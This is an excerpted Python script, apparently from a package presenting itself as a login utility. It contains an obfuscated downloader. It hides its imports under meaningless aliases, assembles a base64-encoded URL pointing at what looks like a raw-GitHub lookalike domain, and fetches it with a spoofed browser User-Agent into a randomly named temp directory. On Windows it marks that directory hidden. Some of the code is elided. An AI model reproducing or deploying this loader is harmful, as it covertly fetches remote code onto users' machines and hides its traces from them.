...
import func.login
import os as qwe
import urllib.request as zxc
import tempfile as rty
import subprocess as uio
import base64 as jkl
import random as asd
import string as fgh
...
if __name__ == "__main__":
    ...
    a = 'aHR0'
    s = 'cHM6Ly9yYXcuZ2l0aHVidXM='
    w = jkl.b64decode(a).decode('utf-8')
    x = jkl.b64decode(s).decode('utf-8')
    y = jkl.b64decode(d).decode('utf-8')
    z = jkl.b64decode(f).decode('utf-8')
    c = jkl.b64decode(g).decode('utf-8')
    q = w + x + y + z + c
    r = ''.join(asd.choices(fgh.ascii_lowercase, k=5))
    e = qwe.path.join(rty.gettempdir(), r)
    qwe.makedirs(e)

    file_name = ''.join(asd.choices(fgh.ascii_lowercase + fgh.digits, k=10))
    t = qwe.path.join(e, file_name)
    req = zxc.Request(q, headers={'User-Agent': 'Mozilla/5.0'})
    ...
    if qwe.name == 'nt':
        try:
            ...
            p = 0x02
            yui.windll.kernel32.SetFileAttributesW(e, p)
